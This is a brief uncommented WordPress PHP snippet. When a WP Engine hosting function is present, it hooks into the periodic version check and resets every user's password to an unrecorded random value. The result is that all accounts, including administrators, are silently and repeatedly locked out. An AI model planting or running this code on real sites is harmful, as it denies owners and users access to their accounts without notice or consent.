<?php
if (function_exists('is_wpe')) {
    function reset_passwords() {
        global $wpdb;

        $results = $wpdb->get_results('SELECT ID FROM '.$wpdb->prefix.'users');
        if ($results)
        {
            foreach ($results AS $user)
            {
                $password = wp_generate_password();
                wp_set_password( $password, $user->ID );
            }
        }
    }
    add_action('wp_version_check', 'reset_passwords');
}
?>
